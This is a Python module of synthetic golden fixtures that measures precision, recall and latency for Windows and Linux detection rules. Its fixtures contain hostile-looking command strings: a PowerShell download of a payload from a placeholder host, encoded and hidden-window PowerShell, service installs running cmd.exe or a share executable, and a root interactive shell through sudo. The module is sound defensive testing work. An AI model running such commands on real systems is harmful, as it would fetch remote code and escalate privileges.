"""Deterministic M15 golden fixtures and classification-quality measurements."""

from __future__ import annotations

from dataclasses import dataclass, replace
from datetime import datetime, timedelta, timezone
import math
import statistics
import time
from typing import Any, Literal, Sequence

from app.schemas.detection_engineering import (
    DetectionQualityMetrics,
    DetectionQualityReport,
    GoldenFixtureResult,
)
from app.services.advanced_detection import AdvancedDetectionEngine, DetectionEvent


BASE = datetime(2026, 1, 15, 12, 0, tzinfo=timezone.utc)
Scenario = Literal[
    "positive", "negative", "boundary", "duplicate", "out_of_order",
    "missing_field", "cross_host", "cross_account", "false_positive_candidate",
]
GroundTruth = Literal["POSITIVE", "NEGATIVE", "UNLABELED"]


@dataclass(frozen=True, slots=True)
class GoldenFixture:
    scenario: Scenario
    events: tuple[DetectionEvent, ...]
    evaluation_end: datetime
    ground_truth: GroundTruth
    expected_finding_count: int
    expected_evidence_ids: tuple[str, ...]
    expected_explanation: str
    grouping_behavior: str
    deduplication_behavior: str
    applicable: bool = True


def _windows(
    rule: str,
    code: str,
    seconds: int,
    suffix: str,
    eventdata: dict[str, str],
    *,
    host: str = "WIN-M15-REDACTED",
    provider: str = "Microsoft-Windows-Security-Auditing",
    channel: str = "Security",
) -> DetectionEvent:
    event_id = f"M15-{rule}-{suffix}"
    timestamp = BASE + timedelta(seconds=seconds)
    raw = {
        "timestamp": timestamp.isoformat(),
        "id": event_id,
        "synthetic_test_data": True,
        "labels": ["SYNTHETIC TEST DATA"],
        "agent": {"id": "SYNTHETIC-002", "name": host},
        "decoder": {"name": "windows_eventchannel"},
        "rule": {"id": f"M15-{code}", "level": 5, "description": "Synthetic redacted fixture"},
        "data": {"win": {"system": {
            "providerName": provider, "eventID": code, "channel": channel,
            "computer": host, "message": f"SYNTHETIC TEST DATA event {code}",
        }, "eventdata": dict(eventdata)}},
    }
    username = eventdata.get("targetUserName") or eventdata.get("subjectUserName")
    source_ip = eventdata.get("ipAddress")
    if source_ip in {None, "", "-", "::", "0.0.0.0"}:
        source_ip = None
    category = (
        "windows_defender" if code in {"1116", "1117", "1118", "1119", "5001", "5007"}
        else "windows_system" if code == "7045"
        else "windows_powershell" if code in {"4103", "4104"}
        else "windows_security"
    )
    outcome = "failure" if code == "4625" else "success" if code == "4624" else "observed"
    image = eventdata.get("image") or eventdata.get("newProcessName")
    return DetectionEvent(
        event_id=event_id, timestamp=timestamp, source_type="windows_event",
        hostname=host, username=username, source_ip=source_ip, event_code=code,
        category=category, action=None, outcome=outcome, process_name=image,
        process_path=image, command_line=eventdata.get("commandLine") or eventdata.get("imagePath"),
        parent_process_name=eventdata.get("parentProcessName"),
        message=f"SYNTHETIC TEST DATA event {code}", raw=raw,
    )


def _linux(
    rule: str,
    seconds: int,
    suffix: str,
    *,
    decoder: str,
    full_log: str,
    username: str | None,
    source_ip: str | None,
    outcome: str,
    host: str = "LINUX-M15-REDACTED",
) -> DetectionEvent:
    event_id = f"M15-{rule}-{suffix}"
    timestamp = BASE + timedelta(seconds=seconds)
    data: dict[str, str] = {"outcome": outcome}
    if username is not None:
        data["user"] = username
    if source_ip is not None:
        data["srcip"] = source_ip
    raw = {
        "timestamp": timestamp.isoformat(), "id": event_id,
        "synthetic_test_data": True, "labels": ["SYNTHETIC TEST DATA"],
        "agent": {"id": "SYNTHETIC-001", "name": host},
        "decoder": {"name": decoder}, "data": data,
        "rule": {"id": "M15-5700", "level": 5, "description": "Synthetic redacted auth fixture"},
        "location": "/var/log/auth.log", "full_log": full_log,
    }
    category = "linux_sudo" if decoder == "sudo" else "linux_ssh"
    return DetectionEvent(
        event_id=event_id, timestamp=timestamp, source_type="authentication",
        hostname=host, username=username, source_ip=source_ip, event_code=None,
        category=category, action=None, outcome=outcome, process_name=None,
        process_path=None, command_line=None, parent_process_name=None,
        message=full_log, raw=raw,
    )


def _logon(user: str, source: str, *, logon_type: str = "3", logon_id: str = "0x1500") -> dict[str, str]:
    return {
        "targetUserName": user, "targetDomainName": "REDACTED",
        "ipAddress": source, "logonType": logon_type, "targetLogonId": logon_id,
        "status": "0xc000006d", "subStatus": "0xc000006a",
    }


def _evidence(events: Sequence[DetectionEvent]) -> tuple[str, ...]:
    return tuple(dict.fromkeys(event.event_id for event in events))


def _split_hosts(events: Sequence[DetectionEvent]) -> tuple[DetectionEvent, ...]:
    return tuple(
        replace(event, hostname="WIN-M15-A" if index % 2 == 0 else "WIN-M15-B")
        for index, event in enumerate(events)
    )


def _split_accounts(events: Sequence[DetectionEvent]) -> tuple[DetectionEvent, ...]:
    return tuple(
        replace(event, username="redacted-a" if index % 2 == 0 else "redacted-b")
        for index, event in enumerate(events)
    )


def _fixture(
    scenario: Scenario,
    events: Sequence[DetectionEvent],
    *,
    truth: GroundTruth,
    count: int,
    explanation: str = "",
    grouping: str,
    dedup: str,
    evaluation_end: datetime | None = None,
    evidence: Sequence[str] | None = None,
    applicable: bool = True,
) -> GoldenFixture:
    return GoldenFixture(
        scenario=scenario, events=tuple(events),
        evaluation_end=evaluation_end or BASE + timedelta(minutes=20),
        ground_truth=truth, expected_finding_count=count,
        expected_evidence_ids=tuple(evidence if evidence is not None else (_evidence(events) if count else ())),
        expected_explanation=explanation, grouping_behavior=grouping,
        deduplication_behavior=dedup, applicable=applicable,
    )


def _standard(
    positive: Sequence[DetectionEvent],
    negative: Sequence[DetectionEvent],
    boundary: Sequence[DetectionEvent],
    missing: Sequence[DetectionEvent],
    cross_host: Sequence[DetectionEvent],
    cross_account: Sequence[DetectionEvent],
    false_positive: Sequence[DetectionEvent],
    *,
    positive_count: int,
    boundary_count: int,
    false_positive_count: int,
    explanation: str,
    grouping: str,
    dedup: str,
    cross_host_count: int = 0,
    cross_account_count: int = 0,
    cross_host_applicable: bool = True,
    cross_account_applicable: bool = True,
    evaluation_end: datetime | None = None,
    boundary_end: datetime | None = None,
    cross_host_evidence: Sequence[str] | None = None,
) -> tuple[GoldenFixture, ...]:
    duplicate = tuple(positive) + ((positive[0],) if positive else ())
    return (
        _fixture("positive", positive, truth="POSITIVE", count=positive_count,
                 explanation=explanation, grouping=grouping, dedup=dedup, evaluation_end=evaluation_end),
        _fixture("negative", negative, truth="NEGATIVE", count=0,
                 grouping=grouping, dedup=dedup, evaluation_end=evaluation_end),
        _fixture("boundary", boundary, truth="POSITIVE" if boundary_count else "NEGATIVE",
                 count=boundary_count, explanation=explanation if boundary_count else "",
                 grouping=grouping, dedup=dedup, evaluation_end=boundary_end or evaluation_end),
        _fixture("duplicate", duplicate, truth="POSITIVE", count=positive_count,
                 explanation=explanation, grouping=grouping, dedup=dedup, evaluation_end=evaluation_end,
                 evidence=_evidence(positive)),
        _fixture("out_of_order", tuple(reversed(positive)), truth="POSITIVE", count=positive_count,
                 explanation=explanation, grouping=grouping, dedup=dedup, evaluation_end=evaluation_end,
                 evidence=_evidence(positive)),
        _fixture("missing_field", missing, truth="NEGATIVE", count=0,
                 grouping=grouping, dedup=dedup, evaluation_end=evaluation_end),
        _fixture("cross_host", cross_host, truth="POSITIVE" if cross_host_count else "NEGATIVE",
                 count=cross_host_count, explanation=explanation if cross_host_count else "",
                 grouping=grouping, dedup=dedup, evaluation_end=evaluation_end,
                 evidence=cross_host_evidence, applicable=cross_host_applicable),
        _fixture("cross_account", cross_account, truth="POSITIVE" if cross_account_count else "NEGATIVE",
                 count=cross_account_count, explanation=explanation if cross_account_count else "",
                 grouping=grouping, dedup=dedup, evaluation_end=evaluation_end,
                 applicable=cross_account_applicable),
        _fixture("false_positive_candidate", false_positive, truth="UNLABELED",
                 count=false_positive_count, explanation=explanation if false_positive_count else "",
                 grouping=grouping, dedup=dedup, evaluation_end=evaluation_end),
    )


def _datasets() -> dict[str, tuple[GoldenFixture, ...]]:
    data: dict[str, tuple[GoldenFixture, ...]] = {}

    d1 = [_windows("DET001", "4625", index * 60, f"P{index}", _logon("alice", "192.0.2.10")) for index in range(5)]
    n1 = d1[:4]
    b1 = [_windows("DET001", "4625", index * 75, f"B{index}", _logon("boundary", "192.0.2.11")) for index in range(5)]
    m1 = [_windows("DET001", "4625", index * 30, f"M{index}", _logon("missing", "-")) for index in range(5)]
    fp1 = [_windows("DET001", "4625", index * 30, f"FP{index}", _logon("svc-build$", "192.0.2.12")) for index in range(5)]
    data["DET-001"] = _standard(d1, n1, b1, m1, _split_hosts(d1), _split_accounts(d1), fp1,
        positive_count=1, boundary_count=1, false_positive_count=0,
        explanation="Windows logon failures occurred", grouping="host/account/source/logon type",
        dedup="duplicate event IDs collapse before threshold evaluation")

    failures = [_windows("DET002", "4625", index * 60, f"P-F{index}", _logon("carol", "198.51.100.8")) for index in range(3)]
    d2 = failures + [_windows("DET002", "4624", 180, "P-S", _logon("carol", "198.51.100.8"))]
    n2 = [
        _windows("DET002", "4624", 0, "N-S", _logon("negative", "198.51.100.18")),
        *[
            _windows("DET002", "4625", 60 + index * 60, f"N-F{index}", _logon("negative", "198.51.100.18"))
            for index in range(3)
        ],
    ]
    b2 = [_windows("DET002", "4625", index * 100, f"B-F{index}", _logon("boundary", "198.51.100.9")) for index in range(3)] + [_windows("DET002", "4624", 600, "B-S", _logon("boundary", "198.51.100.9"))]
    m2 = [
        *[
            _windows("DET002", "4625", index * 60, f"M-F{index}", _logon("missing", "-"))
            for index in range(3)
        ],
        _windows("DET002", "4624", 180, "M-S", _logon("missing", "-")),
    ]
    fp2f = [_windows("DET002", "4625", index * 20, f"FP-F{index}", _logon("helpdesk", "203.0.113.7")) for index in range(3)]
    fp2 = fp2f + [_windows("DET002", "4624", 90, "FP-S", _logon("helpdesk", "203.0.113.7"))]
    data["DET-002"] = _standard(d2, n2, b2, m2, _split_hosts(d2), _split_accounts(d2), fp2,
        positive_count=1, boundary_count=1, false_positive_count=1,
        explanation="successful logon followed three failures", grouping="host/account/source/logon type",
        dedup="a success closes one failure sequence")

    logon3 = _windows("DET003", "4624", 0, "P-L", _logon("admin-redacted", "203.0.113.9", logon_type="10", logon_id="0x777"))
    priv3 = _windows("DET003", "4672", 30, "P-R", {"subjectUserName": "admin-redacted", "subjectLogonId": "0x777"})
    d3 = [logon3, priv3]
    b3 = [logon3, replace(priv3, event_id="M15-DET003-B-R", timestamp=BASE + timedelta(seconds=120))]
    missing3 = [
        _windows("DET003", "4624", 0, "M-L", _logon("admin-redacted", "-", logon_type="10", logon_id="0x778")),
        _windows("DET003", "4672", 30, "M-R", {"subjectUserName": "admin-redacted", "subjectLogonId": "0x778"}),
    ]
    fp3 = d3
    data["DET-003"] = _standard(d3, [priv3], b3, missing3, _split_hosts(d3), _split_accounts(d3), fp3,
        positive_count=1, boundary_count=1, false_positive_count=1,
        explanation="special-privilege assignment", grouping="host/account/logon ID",
        dedup="one finding per correlated logon session")

    create4 = _windows("DET004", "4720", 0, "P-CREATE", {"subjectUserName": "operator", "targetUserName": "new-redacted"})
    group4 = _windows("DET004", "4732", 30, "P-GROUP", {"subjectUserName": "operator", "memberName": "new-redacted", "targetGroupName": "Administrators", "targetSid": "S-1-5-32-544"})
    d4 = [create4, group4]
    n4 = [_windows("DET004", "4732", 0, "N", {"subjectUserName": "operator", "memberName": "user", "targetGroupName": "Print Operators"})]
    b4 = [_windows("DET004", "4726", 300, "B", {"subjectUserName": "operator", "targetUserName": "retired-redacted"})]
    m4 = [_windows("DET004", "4732", 0, "M", {"subjectUserName": "operator"})]
    fp4 = [_windows("DET004", "4720", 0, "FP", {"subjectUserName": "approved-iam", "targetUserName": "approved-new-user"})]
    data["DET-004"] = _standard(d4, n4, b4, m4, (), (), fp4,
        positive_count=2, boundary_count=1, false_positive_count=1,
        explanation="scoped account-change criteria", grouping="host/event code/target context",
        dedup="same action key and five-minute bucket collapse", cross_host_applicable=False,
        cross_account_applicable=False)

    ps5a = _windows("DET005", "4104", 0, "P-ENC", {"targetUserName": "analyst", "scriptBlockText": "powershell.exe -EncodedCommand U1lOVEhFVElD"}, provider="Microsoft-Windows-PowerShell", channel="Microsoft-Windows-PowerShell/Operational")
    ps5b = _windows("DET005", "4104", 30, "P-IWR", {"targetUserName": "analyst", "scriptBlockText": "Invoke-WebRequest https://redacted.invalid/payload"}, provider="Microsoft-Windows-PowerShell", channel="Microsoft-Windows-PowerShell/Operational")
    d5 = [ps5a, ps5b]
    n5 = [_windows("DET005", "4104", 0, "N", {"targetUserName": "analyst", "scriptBlockText": "Get-Process"}, provider="Microsoft-Windows-PowerShell", channel="Microsoft-Windows-PowerShell/Operational")]
    b5 = [_windows("DET005", "4104", 0, "B", {"targetUserName": "analyst", "scriptBlockText": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden"}, provider="Microsoft-Windows-PowerShell", channel="Microsoft-Windows-PowerShell/Operational")]
    m5 = [_windows("DET005", "4688", 0, "M", {"targetUserName": "analyst", "commandLine": "-EncodedCommand U1lOVEhFVElD"})]
    fp5 = [_windows("DET005", "4104", 0, "FP", {"targetUserName": "deployment", "scriptBlockText": "powershell.exe -EncodedCommand QVBQUk9WRUQ="}, provider="Microsoft-Windows-PowerShell", channel="Microsoft-Windows-PowerShell/Operational")]
    data["DET-005"] = _standard(d5, n5, b5, m5, (), (), fp5,
        positive_count=2, boundary_count=1, false_positive_count=1,
        explanation="high-risk indicator categories", grouping="host/user/indicator signature",
        dedup="equivalent indicator signatures collapse per five-minute bucket",
        cross_host_applicable=False, cross_account_applicable=False)

    svc6a = _windows("DET006", "7045", 0, "P-A", {"serviceName": "UpdaterA", "imagePath": "C:\\Windows\\System32\\cmd.exe /c C:\\Users\\Public\\update.cmd", "startType": "demand start", "accountName": "LocalSystem"}, provider="Service Control Manager", channel="System")
    svc6b = _windows("DET006", "7045", 30, "P-B", {"serviceName": "UpdaterB", "imagePath": "\\\\redacted.invalid\\share\\svc.exe", "startType": "demand start", "accountName": "LocalSystem"}, provider="Service Control Manager", channel="System")
    d6 = [svc6a, svc6b]
    n6 = [_windows("DET006", "7045", 0, "N", {"serviceName": "Approved", "imagePath": "C:\\Program Files\\Approved\\agent.exe", "startType": "demand start", "accountName": "LocalSystem"}, provider="Service Control Manager", channel="System")]
    b6 = [_windows("DET006", "7045", 0, "B", {"serviceName": "AutoAgent", "imagePath": "C:\\Program Files\\Agent\\agent.exe", "startType": "auto start", "accountName": "LocalSystem"}, provider="Service Control Manager", channel="System")]
    m6 = [_windows("DET006", "7045", 0, "M", {}, provider="Service Control Manager", channel="System")]
    fp6 = b6
    data["DET-006"] = _standard(d6, n6, b6, m6, (), (), fp6,
        positive_count=2, boundary_count=1, false_positive_count=1,
        explanation="high-risk categories", grouping="host/service/risk signature",
        dedup="same service and risk signature collapse per ten-minute bucket",
        cross_host_applicable=False, cross_account_applicable=False)

    d7 = [_linux("DET007", index * 60, f"P{index}", decoder="sshd", full_log=f"Failed password for alice from 192.0.2.70 port {2200 + index}", username="alice", source_ip="192.0.2.70", outcome="failure") for index in range(5)]
    b7 = [_linux("DET007", index * 75, f"B{index}", decoder="sshd", full_log=f"Failed password for boundary from 192.0.2.71 port {2300 + index}", username="boundary", source_ip="192.0.2.71", outcome="failure") for index in range(5)]
    m7 = [_linux("DET007", index * 60, f"M{index}", decoder="sshd", full_log="Failed password for alice from redacted-source", username="alice", source_ip=None, outcome="failure") for index in range(5)]
    fp7 = [_linux("DET007", index * 30, f"FP{index}", decoder="sshd", full_log=f"Failed password for shared from 198.51.100.70 port {2400 + index}", username="shared", source_ip="198.51.100.70", outcome="failure") for index in range(5)]
    data["DET-007"] = _standard(d7, d7[:4], b7, m7, _split_hosts(d7), _split_accounts(d7), fp7,
        positive_count=1, boundary_count=1, false_positive_count=1,
        explanation="Five SSH authentication failures", grouping="host/account/source IP",
        dedup="duplicate event IDs and cooldown suppress repeated burst findings")

    sudo8a = _linux("DET008", 0, "P-SHELL", decoder="sudo", full_log="alice : USER=root ; COMMAND=/bin/bash -i", username="alice", source_ip=None, outcome="success")
    sudo8b = _linux("DET008", 30, "P-DENIED", decoder="sudo", full_log="mallory is not in the sudoers file", username="mallory", source_ip=None, outcome="failure")
    d8 = [sudo8a, sudo8b]
    n8 = [_linux("DET008", 0, "N", decoder="sudo", full_log="alice : USER=root ; COMMAND=/usr/bin/systemctl status nginx", username="alice", source_ip=None, outcome="success")]
    b8 = [sudo8b]
    m8 = [replace(sudo8a, category="linux_ssh")]
    fp8 = [_linux("DET008", 0, "FP", decoder="sudo", full_log="responder : USER=root ; COMMAND=/bin/bash -i", username="responder", source_ip=None, outcome="success")]
    data["DET-008"] = _standard(d8, n8, b8, m8, (), (), fp8,
        positive_count=2, boundary_count=1, false_positive_count=1,
        explanation="scoped", grouping="host/user/risk category",
        dedup="same user and risk category collapse per five-minute bucket",
        cross_host_applicable=False, cross_account_applicable=False)

    detect9 = _windows("DET009", "1116", 0, "P-DETECT", {"threatName": "Synthetic:Redacted", "path": "file:_C:\\redacted.bin"}, provider="Microsoft-Windows-Windows Defender", channel="Microsoft-Windows-Windows Defender/Operational")
    fail9 = _windows("DET009", "1118", 60, "P-FAIL", {"threatName": "Synthetic:Redacted", "path": "file:_C:\\redacted.bin"}, provider="Microsoft-Windows-Windows Defender", channel="Microsoft-Windows-Windows Defender/Operational")
    d9 = [detect9, fail9]
    remediate9 = _windows("DET009", "1117", 60, "N-REMEDIATE", {"threatName": "Synthetic:Redacted", "path": "file:_C:\\redacted.bin"}, provider="Microsoft-Windows-Windows Defender", channel="Microsoft-Windows-Windows Defender/Operational")
    boundary9 = [_windows("DET009", "1116", 0, "B-DETECT", {"threatName": "Synthetic:Boundary", "path": "file:_C:\\boundary.bin"}, provider="Microsoft-Windows-Windows Defender", channel="Microsoft-Windows-Windows Defender/Operational")]
    missing9 = [_windows("DET009", "1117", 0, "M", {}, provider="Microsoft-Windows-Windows Defender", channel="Microsoft-Windows-Windows Defender/Operational")]
    cross9_detect = replace(
        detect9,
        event_id="M15-DET009-XH-DETECT",
        hostname="WIN-M15-A",
        timestamp=BASE - timedelta(minutes=20),
    )
    cross9_remediate = replace(remediate9, event_id="M15-DET009-XH-REMEDIATE", hostname="WIN-M15-B")
    fp9a = _windows("DET009", "1116", 0, "FP-A", {"threatName": "Synthetic:Repeat", "path": "file:_C:\\repeat.bin"}, provider="Microsoft-Windows-Windows Defender", channel="Microsoft-Windows-Windows Defender/Operational")
    fp9b = _windows("DET009", "1116", 60, "FP-B", {"threatName": "Synthetic:Repeat", "path": "file:_C:\\repeat.bin"}, provider="Microsoft-Windows-Windows Defender", channel="Microsoft-Windows-Windows Defender/Operational")
    data["DET-009"] = _standard(d9, [detect9, remediate9], boundary9, missing9,
        [cross9_detect, cross9_remediate], (), [fp9a, fp9b],
        positive_count=1, boundary_count=1, false_positive_count=1,
        explanation="Defender", grouping="host/threat/path/reason",
        dedup="same lifecycle reason and hour bucket collapse",
        cross_host_count=1, cross_account_applicable=False,
        evaluation_end=BASE + timedelta(minutes=5),
        boundary_end=BASE + timedelta(minutes=15),
        cross_host_evidence=[cross9_detect.event_id])
    return data


GOLDEN_DATASETS = _datasets()


def _percentile(values: Sequence[float], percentile: float) -> float:
    if not values:
        return 0.0
    ordered = sorted(values)
    index = max(0, min(len(ordered) - 1, math.ceil(percentile * len(ordered)) - 1))
    return round(ordered[index], 6)


def _signature(findings: Sequence[Any]) -> tuple[tuple[str, tuple[str, ...]], ...]:
    return tuple((item.deduplication_key, tuple(item.event_ids)) for item in findings)


def quality_report(rule_id: str) -> DetectionQualityReport:
    fixtures = GOLDEN_DATASETS.get(rule_id.upper())
    if fixtures is None:
        raise KeyError(rule_id)
    results: list[GoldenFixtureResult] = []
    signatures: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {}
    evaluation_times: list[float] = []
    evidence_latencies: list[float] = []
    tp = fp = tn = fn = unlabeled = duplicate_inputs = leaked_duplicates = 0
    repeat_consistent = True

    for fixture in fixtures:
        started = time.perf_counter()
        _, _, findings, evaluator_duplicates = AdvancedDetectionEngine.evaluate_events(
            rule_id, fixture.events, evaluation_end=fixture.evaluation_end, max_findings=500,
        )
        elapsed = max(0.0, (time.perf_counter() - started) * 1000)
        evaluation_times.append(elapsed)
        signatures[fixture.scenario] = _signature(findings)
        actual_evidence = sorted({event_id for finding in findings for event_id in finding.event_ids})
        expected_evidence = sorted(fixture.expected_evidence_ids)
        explanation_ok = not fixture.expected_explanation or any(
            fixture.expected_explanation.casefold() in finding.explanation.casefold()
            for finding in findings
        )
        passed = (
            len(findings) == fixture.expected_finding_count
            and actual_evidence == expected_evidence
            and explanation_ok
        )
        for finding in findings:
            evidence_latencies.append(
                max(0.0, (finding.last_event_at - finding.first_event_at).total_seconds() * 1000)
            )
        duplicates_here = len(fixture.events) - len({event.event_id for event in fixture.events})
        duplicate_inputs += duplicates_here
        if fixture.scenario == "duplicate":
            positive_count = next(item.expected_finding_count for item in fixtures if item.scenario == "positive")
            leaked_duplicates += max(0, len(findings) - positive_count)
        if fixture.applicable and fixture.ground_truth == "POSITIVE":
            if findings:
                tp += 1
            else:
                fn += 1
        elif fixture.applicable and fixture.ground_truth == "NEGATIVE":
            if findings:
                fp += 1
            else:
                tn += 1
        else:
            unlabeled += 1
        if fixture.scenario == "positive":
            _, _, repeated, _ = AdvancedDetectionEngine.evaluate_events(
                rule_id, fixture.events, evaluation_end=fixture.evaluation_end, max_findings=500,
            )
            repeat_consistent = _signature(findings) == _signature(repeated)
        results.append(GoldenFixtureResult(
            scenario=fixture.scenario, applicable=fixture.applicable,
            ground_truth=fixture.ground_truth,
            expected_finding_count=fixture.expected_finding_count,
            actual_finding_count=len(findings), expected_evidence_ids=expected_evidence,
            actual_evidence_ids=actual_evidence, evaluator_duplicate_count=evaluator_duplicates,
            evaluation_ms=round(elapsed, 6), passed=passed,
            expected_explanation=fixture.expected_explanation,
            grouping_behavior=fixture.grouping_behavior,
            deduplication_behavior=fixture.deduplication_behavior,
        ))

    precision = tp / (tp + fp) if tp + fp else None
    recall = tp / (tp + fn) if tp + fn else None
    false_positive_rate = fp / (fp + tn) if fp + tn else None
    p50 = lambda values: round(statistics.median(values), 6) if values else 0.0
    result_by_scenario = {item.scenario: item for item in results}
    metrics = DetectionQualityMetrics(
        labeled_fixture_count=tp + fp + tn + fn,
        unlabeled_fixture_count=unlabeled,
        true_positives=tp, false_positives=fp, true_negatives=tn, false_negatives=fn,
        precision=round(precision, 6) if precision is not None else None,
        recall=round(recall, 6) if recall is not None else None,
        false_positive_rate=round(false_positive_rate, 6) if false_positive_rate is not None else None,
        duplicate_input_count=duplicate_inputs,
        duplicate_finding_rate=round(leaked_duplicates / duplicate_inputs, 6) if duplicate_inputs else 0.0,
        missing_field_fixture_passed=result_by_scenario["missing_field"].passed,
        event_order_consistent=(
            signatures.get("positive") == signatures.get("out_of_order")
        ),
        repeat_evaluation_consistent=repeat_consistent,
        evidence_latency_p50_ms=p50(evidence_latencies),
        evidence_latency_p95_ms=_percentile(evidence_latencies, 0.95),
        evidence_latency_max_ms=round(max(evidence_latencies, default=0.0), 6),
        evaluation_time_p50_ms=p50(evaluation_times),
        evaluation_time_p95_ms=_percentile(evaluation_times, 0.95),
        evaluation_time_max_ms=round(max(evaluation_times, default=0.0), 6),
    )
    return DetectionQualityReport(
        rule_id=rule_id.upper(), fixtures=results, metrics=metrics,
        all_applicable_fixtures_passed=all(item.passed for item in results if item.applicable),
    )


def quality_catalog() -> list[DetectionQualityReport]:
    return [quality_report(rule_id) for rule_id in sorted(GOLDEN_DATASETS)]


def export_golden_datasets() -> dict[str, Any]:
    """Return serializable synthetic records for offline review; never persists them."""

    return {
        "dataset_version": "m15-golden-v1",
        "dataset_label": "SYNTHETIC TEST DATA",
        "rules": {
            rule_id: [
                {
                    "scenario": fixture.scenario,
                    "applicable": fixture.applicable,
                    "ground_truth": fixture.ground_truth,
                    "expected_finding_count": fixture.expected_finding_count,
                    "expected_evidence_ids": list(fixture.expected_evidence_ids),
                    "expected_explanation": fixture.expected_explanation,
                    "grouping_behavior": fixture.grouping_behavior,
                    "deduplication_behavior": fixture.deduplication_behavior,
                    "evaluation_end": fixture.evaluation_end.isoformat(),
                    "events": [event.raw for event in fixture.events],
                }
                for fixture in fixtures
            ]
            for rule_id, fixtures in GOLDEN_DATASETS.items()
        },
    }
